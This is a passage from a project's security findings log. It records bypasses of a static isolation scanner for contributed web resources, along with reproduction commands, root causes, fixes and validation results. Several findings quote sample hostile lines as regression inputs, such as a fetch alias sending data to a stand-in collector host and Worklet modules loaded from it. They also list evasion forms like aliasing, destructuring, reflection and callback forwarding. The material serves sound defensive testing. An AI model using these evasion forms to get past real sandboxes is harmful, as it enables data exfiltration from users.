links using an explicit anchor remain valid. This keeps navigation user-driven

and prevents resource code from embedding input data in an off-site URL.

**Validation:** The scanner regression was red before the fix and passes with

the complete registry-gate suite (72/72). The full unit suite passes 1,198

tests across 76 files, including the new real-process CLI regression. Typecheck

passes all 22 packages, lint passes, the desktop/mobile

preview-CSP suite passes 18/18, and `pnpm audit:all` passes all 16 behavioral

gates, the 324-resource source-isolation matrix, production build, bundle

budgets, provenance audit, secret/security audit, and dependency audit. The

real-process CLI regression copies a valid resource manifest, adds a dynamic

navigation sink, then runs `tess gate <resource> --format json`; it confirms a

nonzero process status, a rejected verdict, and a failed `security-isolation`

check. The CLI black-box suite passes 17/17, all 22 workspace typechecks pass,

and ESLint passes on the changed test. The fix remains local and requires the

release-candidate deployment audit.

### SEC-37-110 — Medium — registry gate allowed scripted popup navigation

**Evidence:** A resource containing `window.open(destination, '_blank')` passed

the static isolation check before the fix. The direct preview's CSP sandbox

blocks popup creation, but the gate's untrusted-source policy also applies to

other registry and preview consumers. A local browser regression confirms the

Sites preview cannot open a popup or emit a request at 1440×900 or 390×844.

See [`programmatic popup navigation`](evidence/step-37/programmatic-popup-navigation.json)

and the captured desktop/mobile screenshots.

**Reproduction:** Run

`pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "programmatic popup navigation"`.

The regression returned `pass` before the implementation. It now rejects

direct, computed, aliased, destructured, `.call`, `Reflect.apply`, reflected

`Reflect.get`, and bare-global popup calls when the destination is remote or

unresolved; fragment-only navigation remains allowed.

**Root cause:** The source gate constrained `location.assign`/`replace` and

resource URL sinks but did not classify `window.open` as a navigation API.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts`,

`packages/registry-gate/src/__tests__/registry-gate.test.ts`,

`packages/cli/src/__tests__/black-box.test.ts`, and

`tests/e2e/sites-preview-csp.spec.ts`.

**Remediation:** Resolve popup APIs through aliases, destructuring, computed

members, and supported reflection forms, then apply the same external or

unresolved destination policy as programmatic location navigation. The

existing response-level `sandbox allow-scripts` remains an independent browser

boundary.

**Validation:** The focused scanner test failed before the fix and passes with

nine hostile access forms plus a safe-fragment case. The real `tess gate`

black-box test returns a rejected JSON report and nonzero process status. The

Sites CSP browser suite passes 20/20 across desktop and mobile Chromium; its

popup probe observes no popup, external request, or uncaught exception. The

324-resource static source-isolation matrix remains 324/324 with zero findings.

Deployment verification remains pending.

### SEC-37-111 — Medium — standalone preview renderer could navigate the host tab

**Evidence:** Before the fix, a desktop Playwright probe opened

`/preview/?resource=button`, synthesized an external anchor with `target=_self`,

and activated it through `.click()`. Chromium navigated the top-level Site tab

to `chrome-error://chromewebdata/`, even though the response declared

`sandbox allow-scripts`; the request was intercepted locally. The failed-run

context is preserved under `test-results/sites-preview-csp-a-direct-71b8c-n-external-anchor-by-script-sites-chromium/error-context.md`.

The fixed desktop/mobile screenshots and structured evidence are recorded in

[`preview top-level navigation`](evidence/step-37/preview-top-level-navigation.json).

**Reproduction:** Run

`pnpm exec playwright test -c tests/e2e/sites-preview.playwright.config.ts tests/e2e/sites-preview-csp.spec.ts -g "external anchor by script"`.

Before the fix the test observed a changed top-level URL; after the fix the

preview content remains inside the opaque child frame and the top-level Site

route remains unchanged at 1440x900 and 390x844.

**Root cause:** The Sites Worker applied a CSP sandbox to the React renderer but

also served that renderer directly as the `/preview` top-level document. A

sandboxed top-level document may still navigate its own browsing context.

**Affected code:** `apps/site/src/pages/preview/index.astro`,

`apps/site/src/pages/preview-content/index.astro`,

`apps/site/src/scripts/preview-wrapper.ts`,

`apps/site/src/components/PreviewHost.tsx`, `apps/sites/worker.ts`,

`apps/sites/prepare-static.mjs`, and the Sites preview E2E tests.

**Remediation:** `/preview` is now a trusted wrapper with the React renderer

nested in a second iframe carrying `sandbox="allow-scripts"`; the Worker

redirects top-level requests for `/preview-content` back to the wrapper. The

wrapper relays only schema-valid preview messages. The child remains opaque and

retains strict script, style, form, network, and nested-frame policies. Only the

child response omits `frame-ancestors` and `X-Frame-Options`, because its

intentionally opaque wrapper parent cannot satisfy same-origin ancestor checks;

both sandbox controls remain enforced.

**Validation:** The fix passes the Sites adapter build, Worker regression suite

(3/3), and the full focused preview-CSP plus unknown-resource browser suite

(24/24) across desktop and mobile Chromium. The browser checks confirm rendering,

opaque origin, blocked parent DOM/storage access, no popup, no external request,

no top-level navigation, and no uncaught exception. The change remains pending

release-candidate deployment verification.

### SEC-37-112 — Medium — malformed anchor setter arguments crashed source validation

**Evidence:** A registry resource containing `anchor.setAttribute(); anchor.click();`

caused the source-isolation scanner to throw a TypeError while reading the

missing first argument, instead of returning a controlled rejection. The new

regression was red before the fix; the full failing stack is summarized in the

test-run record and the test now receives a failed security-isolation result.

**Reproduction:** Run

`pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "scripted activation of an external anchor"`.

Before the fix, TypeScript reported an undefined-expression type error and

Vitest threw from `resolveStaticStrings`; after the fix, the malformed source is

rejected through the normal gate result.

**Root cause:** The scanner indexed `CallExpression.arguments` before verifying

that the setter supplied an attribute name and value. Malformed contributor

source therefore escaped the gate's normal validation result as an exception.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Check both optional argument expressions before resolving the

attribute name, then fail closed when the activated anchor has no statically

certified destination.

**Validation:** The regression failed before the fix and passes after it. The

registry-gate, Sites security-proxy, and Sites Worker tests pass 80/80; full

workspace typecheck and the final unit suite are being rerun. This finding

remains local pending the release-candidate deployment gate.

### SEC-37-113 — High — same-origin preview updates were rejected by the sandbox renderer

**Evidence:** Before the fix, the Sites Worker state test sent a valid update

from the resource detail page to `/preview-content`; the renderer ignored it,

so the “People directory” filter textbox and requested empty state never

appeared. The failure locator is recorded in

`quality/evidence/step-37/preview-host-origin-before.md`. After the fix, the

toolbar changes the Button from Quiet to Expressive at desktop and mobile sizes;

the before/after captures are in `quality/evidence/step-37/preview-host-variant-*`.

**Reproduction:** Open `/resources/advanced-data-table/` in the Sites Worker

at 360 × 844 and run the visible state flow which sends `TESSELLATE_PREVIEW_UPDATE`

with the “People directory” title and an empty row list. Before the fix the

textbox did not appear. For the variant control, open `/r/button`, click

**Expressive**, and inspect the rendered Button class and screenshot.

**Root cause:** A sandboxed renderer has an opaque own origin, but

`MessageEvent.origin` is the sender's origin. `PreviewHost` incorrectly required

the sender origin to equal
ull`; the same-origin application host therefore

could not initialize or update preview props, variants, theme, device, or motion.

**Affected code:** `apps/site/src/components/PreviewHost.tsx`,

`apps/site/src/components/ResourcePreviewFrame.tsx`, and

`apps/site/src/scripts/preview-wrapper.ts`.

**Remediation:** Require the direct parent window and exact same-origin sender

for mutations. The app host separately accepts READY messages only from the

opaque child origin. The top-level safety wrapper supplies read-only preview

state through URL parameters.

**Validation:** The failing data-table flow now passes. The Sites Worker focused

preview/state/accessibility set passes 14/14; the Gold accessibility matrix

passes all 120 variants; the variant-change regression passes on desktop and

mobile. `pnpm typecheck`, `pnpm lint`, `pnpm test` (1204/1204), and

`pnpm audit:all` pass. The finding remains open until the fixed build passes the

release-candidate deployed verification.

**Aggregate browser verification (2026-10-22):** The first full `pnpm test:e2e`

run exposed a stale resource-copy test helper that searched the trusted outer

preview wrapper for renderer DOM. The error context showed an iframe-only

document and a 15-second `.tess-screen` timeout; the defect was in the test

harness, not the application. The helper now locates the opaque

`iframe[data-tessellate-preview-frame]` and performs preview assertions inside

it. The full aggregate rerun passed: Astro desktop/mobile 262 passed with 100

configured skips; Sites Worker desktop/mobile 173 passed with 33 configured

skips; isolated preview app 3 passed; total 438 passed, 133 configured skips,

zero failures. The 324-resource Sites browser matrix and 40-Gold variant matrix

passed. Typecheck covers 22 workspace packages and lint passes. The tracked

before evidence and structured result are in

`quality/evidence/step-37/preview-frame-harness-before.md` and

`quality/evidence/step-37/e2e-preview-frame-harness.json`. The test-harness

finding is locally resolved; deployed verification remains pending.

**Rate-limit namespace audit (2026-10-22):** Static validation finds five

bindings in each Worker config, ten unique 12-digit namespace IDs total, and

the same five limiter names in both configs. Remote existence remains

unverified: `pnpm --filter @tessellate/api exec wrangler whoami` reports a

400 while fetching the auth token and `Not logged in`. No Cloudflare resource

was changed. Evidence is in

`quality/evidence/step-37/rate-limit-namespace-check.json`; authenticate the

intended Wrangler account before treating the ten namespaces as provisioned.

**Registry gate refresh (2026-10-22):** `pnpm audit:resource-isolation` scanned

all 324 resources and passed 324/324 with zero failures or skipped symlinks.

`pnpm --filter @tessellate/registry-gate test` passed 74/74. This is static

source isolation plus gate-unit coverage; it does not replace deployed CSP,

gateway, namespace-existence, or hostile-preview runtime verification. See

`quality/evidence/step-37/registry-gate-latest.json`.

The API rate-limit contract suite also passes 9/9, covering missing and failed

bindings, identity keys, per-route coverage, early rejection ordering, and

provider-key hashing. The external namespace IDs still require authenticated

Cloudflare verification.

**Laptop backend lifecycle refresh (2026-10-22):** The real Docker verifier passed all eight checks, including authenticated host control, rate limiting, queue persistence across API restart, 503 while the host is stopped, recovery after host resume/restart, and API unavailability while its container is stopped. A follow-up authenticated health request confirmed `hostOnline: true` and both Tessellate containers healthy after the verifier restored them. The machine-readable run is `apps/laptop-backend/evidence/docker-runtime.json`; the post-run health snapshot is `quality/evidence/step-37/docker-lifecycle-postcheck-2026-10-22.json`. This does not cover a fresh OS boot or external tunnel ingress.

**Offline Workbench UI refresh (2026-10-22):** The backend and Sites worker transport regressions pass 8/8. The desktop Workbench browser regression passes and confirms an unsupported command leaves the project unchanged while the laptop Lab is offline; its current 1440 × 900 capture is `quality/evidence/step-37/laptop-backend-offline-workbench-1440x900.png`. The configured mobile skip remains explicit because this particular command bar is desktop-only. The older 2026-10-16 offline screenshots are historical captures and were not used to assess the current layout.

**External ingress boundary:** A read-only host check found `cloudflared` installed but no service or process running. No tunnel has been provisioned under D-041, so this local Docker verification makes no claim that a deployed Site can reach the laptop backend; the Site must continue to show backend-dependent Lab features as unavailable without a configured connection. Both containers have Docker restart policy `unless-stopped`. A Windows restart on 2026-10-22 recovered all eight running Docker containers without a manual Docker start, and both Tessellate containers reported healthy. External tunnel ingress remains inapplicable under D-041.

### SEC-37-114 — Medium — Window and Document proxies bypassed network sink detection

**Evidence:** Three staged red reproductions exposed the resolver gap: `window.window.fetch` passed first; after that fix `window.frames.fetch` still passed; and after adding Window proxy aliases `document.defaultView.fetch` still passed. The machine-readable record is `quality/evidence/step-37/window-proxy-network-alias.json`. Ten direct and globally rooted proxy forms now fail closed. Resource source was parsed only; it was never executed and no request was sent.

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`. The regression covers ten forms through nested `window`, `frames`, `opener`, `parent`, and `Document.defaultView` paths, and checks both the low-level checker and the complete contribution gate.

**Root cause:** Window-reference resolution omitted nested `window`, `frames`, and `opener` members. It also did not resolve `Document.defaultView` to the browser Window, so fetch aliases through these paths were not attributed to protected network APIs.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`.

**Remediation:** Resolve nested Window proxy members and `Document.defaultView` before applying the existing network-sink analysis. The full contribution gate rejects the temporary resource with a failed security-isolation report.

**Validation:** The focused regression passes 2/2 tests, the registry-gate package passes 76 tests, and `pnpm test` passes 1206 tests in 77 files. All 22 workspace typechecks and changed-file ESLint pass; the 324-resource source-isolation scan passes; and `pnpm audit:all` passes all 16 behavioral gates, both production artifacts, bundle budgets, provenance, secret/security, and dependency audits.

**2026-10-22 current verification:** SEC-37-114 is locally fixed and covered through both the checker and complete contribution-gate flow. Three staged bypass probes were observed red during remediation; the final ten-form proxy matrix passes. The latest full workspace suite passes 1,208 tests in 77 files; all 22 workspace typechecks and changed-file ESLint pass; the 324-resource source-isolation scan passes; and `pnpm audit:all` passes all 16 behavioral gates, both production artifacts, bundle budgets, provenance, secret/security, and dependency audits. Public Site re-verification remains at Step 45. A Wrangler `whoami` probe returned 400 / Not logged in, but Cloudflare namespace existence is not an active requirement under owner-approved D-041 because no remote Worker/API deployment or namespace provisioning is planned. Tunnel startup and external ingress are also not applicable under D-041. The Windows restart recovered all eight containers, the API health route returned HTTP 200, and post-boot lifecycle verification passed 8/8; no ticket was deliberately held across shutdown. See evidence/step-37/os-restart-recovery-2026-10-22.json.

### SEC-37-115 — Medium — destructured Window proxies bypassed network sink detection

**Evidence:** The source-gate regression failed for `const { window: browserWindow } = globalThis; const request = browserWindow.fetch; request('https://collector.invalid/data');`. The browser Window alias was lost when renamed through object destructuring. The machine-readable red/green report is `quality/evidence/step-37/window-proxy-destructured-alias.json`. The submitted source was parsed only; it was never executed and no request was sent.

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`. The final regression covers destructured `window`, `frames`, and `Document.defaultView` references and rejects a representative contribution through the full registry gate.

**Root cause:** The Window alias resolver followed ordinary variable initializers but not TypeScript `BindingElement` declarations, which represent renamed destructured bindings.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`.

**Remediation:** Resolve destructured Window proxy aliases only when the property name is static and the source object is already recognized as a Window or Document. This preserves fail-closed handling without treating arbitrary identifiers as browser globals.

**Validation:** The focused regression passes 2/2 tests and covers 23 proxy/alias/callback forms; the registry-gate package passes 76 tests; the full workspace suite passes 1206 tests in 77 files; all 22 workspace typechecks and changed-file ESLint pass; source isolation passes 324/324; and `pnpm audit:all` passes all 16 gates, production builds, budgets, provenance, secret/security, and dependency audits. Public Site verification remains pending for Step 45.
### SEC-37-116 — Medium — mutable Window aliases bypassed network sink detection

**Evidence:** The source-gate regression returned `pass` both for `browserWindow = globalThis.window` and for `({ window: browserWindow } = globalThis)` when followed by an aliased fetch call. The resource source was statically analyzed only; it was never executed and no network request was sent. The red/green report is `quality/evidence/step-37/window-proxy-assignment-alias.json`.

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`. The test rejects direct and destructuring assignments from Window proxies before fetch use, including `document.defaultView`, and verifies representative sources through the complete registry contribution gate.

**Root cause:** Window alias analysis followed declaration initializers and destructured bindings, but it did not trace direct or object-pattern assignment expressions into a mutable identifier.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`.

**Remediation:** Index identifier assignment expressions once for each checker/source-file pair, and consider only earlier direct or statically named object-pattern assignments. Each candidate is resolved by the existing Window proxy analysis.

**Validation:** The focused regression passes 2/2 tests and covers 23 proxy/alias/callback forms; the registry-gate package passes 76 tests; the full workspace suite passes 1206 tests in 77 files; all 22 workspace typechecks and changed-file ESLint pass; the 324-resource isolation scan passes; and `pnpm audit:all` passes all 16 gates, builds, budgets, provenance, security, and dependency checks. Public verification remains pending for Step 45.

### SEC-37-118 — Medium — Worklet APIs loaded executable modules outside the isolation gate

**Evidence:** Before the fix, `AudioContext.audioWorklet.addModule('https://collector.invalid/processor.js')` and `CSS.paintWorklet.addModule('https://collector.invalid/paint.js')` returned `pass`. After direct method detection was added, a dynamically selected method through a `CSS.paintWorklet` alias still returned `pass`. Both regressions were run red before the complete fix. The checker parsed source only; no contributed code was executed and no network request was sent. Machine evidence is `quality/evidence/step-37/worklet-module-loading.json`.

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`. The red-to-green matrix rejects direct AudioWorklet and CSS paint Worklet loads, alias and destructuring forms, reassignment, reflection, typed Worklet parameters, and unknown computed method names. The complete contribution-gate integration rejects representative submissions.

**Root cause:** The static isolation scanner recognized browser fetch, Worker, media, and reflected network APIs, but not the Worklet `addModule()` loader. Worklet modules are executable code fetched outside JavaScript import syntax.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`.

**Remediation:** Treat `addModule` as a dynamic module/network capability, recognize Worklet object aliases when a computed method name is unresolved, and reject reflected `addModule` extraction.

**Validation:** The focused regression file passes 4 tests; the registry-gate package passes 78 tests; `pnpm test` passes 1,208 tests in 77 files; `pnpm test:e2e` passes 438 tests with 133 configured skips and zero failures; the Sites Worker CSP regression passes on desktop and mobile; `pnpm audit:all` passes 16/16 behavioral gates; all 22 typechecks and targeted ESLint pass; and the 324-resource source-isolation scan passes without skipped symlinks. This is local verification only; the release-candidate review Site still requires hostile-preview verification.

### SEC-37-117 — Medium — fetch references escaped through callback parameters

**Evidence:** The source-gate regression returned `pass` when `globalThis.fetch` was passed into a callback; analogous callback references also escaped for WebSocket, XMLHttpRequest, EventSource, and
avigator.sendBeacon`. The function reference crossed into a callback parameter, outside the previous Window-alias resolution path. Resource source was statically parsed only, never executed; no network request was sent. Evidence is in `quality/evidence/step-37/window-proxy-callback-transfer.json`.

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`. The final regression rejects bare/globalThis fetch, WebSocket, XMLHttpRequest, EventSource, and sendBeacon references before callback forwarding; the complete contribution gate rejects representative sources.

**Root cause:** Network sink detection depended on tracing the called alias to a recognized browser Window. Passing a network capability as an argument severed that declaration chain at the function parameter.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts`.

**Remediation:** Reject static fetch, WebSocket, XMLHttpRequest, EventSource, and sendBeacon property access and destructured bindings regardless of receiver. This keeps community resource source from accessing browser network APIs without cross-function dataflow analysis.

**Validation:** The focused regression passes 2/2 tests and covers 23 proxy/alias/callback forms; the registry-gate package passes 76 tests; the full workspace suite passes 1206 tests in 77 files; all 22 workspace typechecks and changed-file ESLint pass; the 324-resource isolation scan passes; and `pnpm audit:all` passes all 16 gates, builds, budgets, provenance, security, and dependency checks. Public verification remains pending for Step 45.

### OS restart recovery — 2026-10-22

**Evidence:** evidence/step-37/os-restart-recovery-2026-10-22.json records the Windows boot time, post-boot container snapshot, API health response, and lifecycle verification. After an approved Restart-Computer, the boot time advanced to 16:19:41 local. All six MGI containers and both Tessellate containers were already running at the first post-boot Docker check; the Tessellate API and host were healthy, and GET http://127.0.0.1:8788/health returned HTTP 200. The existing node scripts/verify-laptop-backend.mjs then passed all eight checks and restored both Tessellate containers healthy.

**Limitation:** No inference job was deliberately left queued across the OS shutdown, so a pre-restart queued job's recovery across full reboot is not directly proven. The verifier proves queue recovery across API restart and host pause/resume, plus new model inference after OS reboot and host-container restart. External tunnel ingress is not applicable under D-041.

**Disposition:** OS restart recovery is verified for automatic container startup and service health. Keep Step 37 open for release-candidate deployed security checks at Step 45.

### OS restart repeat recovery — 2026-10-23

**Evidence:** `quality/evidence/step-37/os-restart-recovery-2026-10-23.json` records the pre-restart Docker snapshot, Windows Event Log stop/start times, post-boot container states, restart policies, and laptop API health response. All eight containers that were running before the approved reboot returned automatically. Both Tessellate containers and PostgreSQL reported healthy; all containers used the existing `unless-stopped` policy and had a zero Docker restart count after startup. `GET http://127.0.0.1:8788/health` returned HTTP 200.

**Limitation:** This repeat check did not leave an inference job queued during shutdown. Recovery of an already queued job across full OS reboot remains unproven. The existing 2026-10-22 lifecycle verification and API restart/host pause-resume checks remain separate evidence.

**Disposition:** Automatic container recovery and laptop API availability passed again. Step 37 remains open for release-candidate deployed security checks at Step 45.

### Deployed review confirmation — 2026-10-24

The user-provided public review URL was checked again in Chrome DevTools at
1440×900 and 390×844. Its response policy still includes `unsafe-inline` for
both `script-src` and `style-src`. A harmless script inserted into the page set a
temporary window flag and generated no `securitypolicyviolation` event. This
confirms AUD-268 remains exploitable on the currently published review build;
the page does not expose its source SHA. The current branch's Sites Worker
build derives inline-script/style hashes and its local CSP tests pass, but this
fix is not closed until the approved release-candidate Site blocks the same
probe. The current capture and probe result are recorded in
`quality/evidence/step-38/review-v20-home-live-2026-10-24.json` and
`quality/evidence/step-38/review-v20-home-desktop-1440.png`. No public Site was
changed during this verification.
